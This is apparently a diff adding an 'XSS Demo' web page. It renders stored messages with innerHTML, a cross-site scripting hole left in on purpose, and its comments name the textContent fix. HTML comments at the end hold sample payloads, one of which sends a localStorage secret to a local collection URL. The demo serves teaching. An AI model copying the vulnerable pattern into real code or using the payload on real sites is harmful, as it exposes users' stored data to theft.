@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>XSS Demo</title>
+
+    <script>
+        function get_messages() {
+            fetch('http://localhost:5000/messages')
+                .then(res => res.json())
+                .then((data) => {
+                    document.getElementById("data_list").innerHTML = ""
+                    for (let i = 0; i < data.result.length; i++) {
+
+                        span_element = document.createElement('span')
+                        h4_element = document.createElement('h4')
+                        h4_element.innerHTML = data.result[i][1] // user innerText or textContent to prevent XSS
+                        p_element = document.createElement('p')
+                        p_element.innerHTML  = data.result[i][2] // user innerText or textContent to prevent XSS
+                        hr_element = document.createElement('hr')
+                        span_element.appendChild(h4_element)
+                        span_element.appendChild(p_element)
+                        span_element.appendChild(hr_element)
+
+                        document.getElementById("data_list").appendChild(span_element);
+                    }
+                })
+                .catch(console.log)
+        }
+
+
+
+        function save_message() {
+            let title = document.getElementById('text_title').value
+            let body = document.getElementById('text_body').value
+
+            if (title === '' || body === '') {
+                alert('Title/Body is empty')
+                return
+            }
+
+            fetch('http://localhost:5000/messages', {
+                    method: 'POST',
+                    headers: {
+                        'Accept': 'application/json',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        title: title,
+                        body: body
+                    })
+                })
+                .then(res => res.json())
+                .then((data) => {
+                    if (data.result === 'True') {
+                        alert('Message Saved!')
+                        get_messages()
+                    }
+                })
+                .catch(console.log)
+        }
+    </script>
+</head>
+
+<body onload="javascript:get_messages()">
+    <div id='data_entry'>
+        <label>Title: </label>
+        <input id='text_title' type="text" placeholder="Enter Text" />
+        <br /><br />
+        <label>Body: </label>
+        <textarea id='text_body' placeholder="Enter Body" rows="8" cols="50"></textarea>
+        <br /><br />
+        <input type="button" value="Save" onclick="javascript:save_message()" />
+        <input type="button" value="Get Messages" onclick="javascript:get_messages()" />
+        <input type="button" value="Save a secret value to local storage" onclick="javascript:localStorage.setItem('secret', Math.random());"/>
+    </div>
+    <br><br>
+    <div id='data_list'>
+
+    </div>
+
+</body>
+
+</html>
+
+<!-- Well, well, well. What have we here?
+<img src='no.img' onerror='javascript:this.style.display = "none";alert("Greetings from XSS!!");'> -->
+
+<!-- 
+Programmer
+A machine that turns coffee to code.
+<img src='no.img' onerror='javascript:this.style.display = "none";alert("got your secret data!!");fetch("http://127.0.0.1:42069/secret/"+localStorage.getItem("secret"));'> 
+-->
